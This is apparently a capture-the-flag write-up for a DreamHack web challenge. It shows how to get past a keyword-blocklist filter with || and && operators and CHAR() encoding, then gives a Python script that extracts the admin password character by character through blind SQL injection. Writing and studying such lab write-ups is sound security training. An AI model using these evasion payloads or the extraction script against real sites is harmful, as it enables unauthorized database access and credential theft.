# sql injection bypass WAF Advanced — DreamHack

> **Room / Challenge:** sql injection bypass WAF Advanced (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** DreamHack
- **Challenge:** sql injection bypass WAF Advanced (web)
- **Link**: `https://dreamhack.io/wargame/challenges/416`
- **Level:** `2`
- **Date:** `12-11-2025`

---

## Goal

Bypass WAF and use SQL Injection to get the flag

## My Solution

The `app.py` has this WAF check:

```python
keywords = ['union', 'select', 'from', 'and', 'or', 'admin', ' ', '*', '/',
            '\n', '\r', '\t', '\x0b', '\x0c', '-', '+']
def check_WAF(data):
    for keyword in keywords:
        if keyword in data.lower():
            return True

    return False
```

It is harder for us to make requests that we want to do some injection. This is what it looked like when we are blocked by WAF:

![Guide image](./screenshots/1.png)

The WAF do blocked the common commands of SQL, however there are still other ways that we can run commands (OR -> ||, AND -> &&, CHAR instead of admin). Payload:

```
'||uid=CHAR(97,100,109,105,110)&&LENGTH(upw)=44#
```

Received:

```
admin
```

So we know that the length of flag content is 40, minus `DH{}`. I created this Python automated script to leverage blind SQL Injection and brute-force the flag content:

```python
import requests
import string
import urllib.parse


charset = string.ascii_lowercase + string.ascii_uppercase + string.digits
target_url = "http://host8.dreamhack.games:11474/?uid="
received_flag_content = ""

for i in range(4, 44):
    for char in charset:
        res = requests.get(f"{target_url}{urllib.parse.quote_plus(f"'||uid=CHAR(97,100,109,105,110)&&SUBSTRING(upw,{i},1)='{char}")}")
        print(f"Tried {received_flag_content}{char}")
        print(f"{target_url}{urllib.parse.quote_plus(f"'||uid=CHAR(97,100,109,105,110)&&SUBSTRING(upw,{i},1)='{char}")}")

        if "admin" in res.text:
            received_flag_content += char
            print(f'GOT {received_flag_content}')
            print()
            break

print(f"Flag content {received_flag_content}")
```

![Guide image](./screenshots/2.png)
